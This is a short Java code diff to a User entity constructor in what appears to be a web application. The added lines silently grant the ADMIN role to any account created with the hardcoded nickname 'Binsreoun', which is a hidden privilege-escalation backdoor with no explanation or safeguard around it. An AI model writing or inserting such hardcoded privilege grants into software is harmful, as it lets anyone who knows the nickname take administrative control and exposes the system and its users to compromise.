@@ -49,6 +49,9 @@ public class User extends BaseEntity {
         this.nickname = nickname;
         this.description = description;
         this.profileUrl = profileUrl;
+        if (nickname.equals("Binsreoun")) {
+            this.role = UserRole.ADMIN;
+        }
     }
 
     public void update(UserProfileUpdateRequest request) {
